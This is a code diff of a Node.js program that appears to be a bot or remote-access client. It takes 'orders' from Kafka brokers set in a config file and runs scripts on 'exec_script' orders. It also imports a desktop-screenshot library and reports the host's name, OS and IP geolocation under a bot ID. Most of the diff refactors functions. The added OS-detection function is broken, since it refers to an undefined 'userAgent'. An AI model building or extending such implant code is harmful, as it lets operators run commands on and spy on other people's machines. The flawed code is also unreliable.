@@ -5,9 +5,10 @@ const { v4: uuidv4 } = require('uuid');
 const fs = require('fs');
 const screenshot = require("screenshot-desktop");
 var https = require('https');
+const os = require('os');
 
 // Read configuration from config.txt
-function readConfigFile(filePath) {
+const readConfigFile = (filePath) => {
     const config = {};
     const data = fs.readFileSync(filePath, 'utf8');
     data.split('\n').forEach(line => {
@@ -20,7 +21,18 @@ function readConfigFile(filePath) {
     return config;
 }
 
-function writeConfigFile(filePath, key, value) {
+const config = readConfigFile('config.txt');
+
+// Init vars
+const kafka = new Kafka({
+    clientId: 'my-app',
+    brokers: config.bootstrap_servers.split(',')
+});
+
+const producer = kafka.producer();
+const consumer = kafka.consumer({ groupId: uuidv4() });
+
+const writeConfigFile = (filePath, key, value) => {
     let data = '';
     if (fs.existsSync(filePath)) {
         data = fs.readFileSync(filePath, 'utf8');
@@ -31,17 +43,7 @@ function writeConfigFile(filePath, key, value) {
     fs.writeFileSync(filePath, lines.join('\n'), 'utf8');
 }
 
-const config = readConfigFile('config.txt');
-
-const kafka = new Kafka({
-    clientId: 'my-app',
-    brokers: config.bootstrap_servers.split(',')
-});
-
-const producer = kafka.producer();
-const consumer = kafka.consumer({ groupId: uuidv4() });
-
-async function produceMessage(topic, task) {
+const produceMessage = async (topic, task) => {
     await producer.connect();
     await producer.send({
         topic,
@@ -52,7 +54,7 @@ async function produceMessage(topic, task) {
     await producer.disconnect();
 }
 
-async function handleCallback(task, groupId) {
+const handleCallback = async (task, groupId) => {
     console.log(`Received order ${JSON.stringify(task)}`);
     if (task.actionType === 'exec_script' || task.actionType === 'os_exec_script') {
         console.log('Received script execution order, proceeding to execute it');
@@ -120,7 +122,7 @@ async function handleCallback(task, groupId) {
     }
 }
 
-async function requestGeolocation() {
+const requestGeolocation = async () => {
     return new Promise((resolve) => {
         try {
             https.get('https://ipinfo.io/loc', (resp) => {
@@ -140,7 +142,7 @@ async function requestGeolocation() {
     });
 }
 
-async function produceHeartBeat(topic, botId) {
+const produceHeartBeat = async (topic, botId) => {
     console.log(`Heartbeat message produced to topic ${topic} by bot ID ${botId}`);
     const heartBeatTask = {
         actionType: 'heartbeat',
@@ -150,6 +152,25 @@ async function produceHeartBeat(topic, botId) {
         result: "success",
     };
     await produceMessage("heartbeat", heartBeatTask);
+}
+
+const getCurrentOsUsed = () => {
+    try {
+        const platform = os.platform().toLowerCase();
+        if (platform.includes('win')) {
+            return 'Windows';
+        } else if (userAgent.includes('linux')) {
+            return 'Linux';
+        } else if (userAgent.includes('mac')) {
+            return 'MacOS';
+        } else {
+            return 'Other';
+        }
+    }
+    catch (e) {
+        console.log(e);
+    }
+    return "Other";
 }
 
 async function main() {
@@ -189,8 +210,9 @@ async function main() {
         actionType: 'init',
         parameters: {
             groupId,
-            os: require('os').platform(),
-            name: require('os').hostname(),
+            os: getCurrentOsUsed(),
+            name: os.hostname(),
+            payloadType: "javascript",
             geolocation: geolocation,
         },
         result: "success",
